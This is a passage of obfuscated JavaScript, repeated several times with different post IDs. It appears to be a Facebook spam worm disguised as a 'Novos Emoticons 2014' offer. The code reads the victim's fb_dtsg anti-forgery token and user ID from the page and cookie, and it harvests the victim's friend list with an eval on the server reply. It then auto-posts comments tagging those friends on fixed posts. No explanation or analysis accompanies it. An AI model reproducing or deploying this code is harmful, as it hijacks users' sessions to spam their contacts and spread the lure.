","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","822753677739551","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","690556874337720","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","454755387989346","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","454755387989346","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","425761117567697","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var 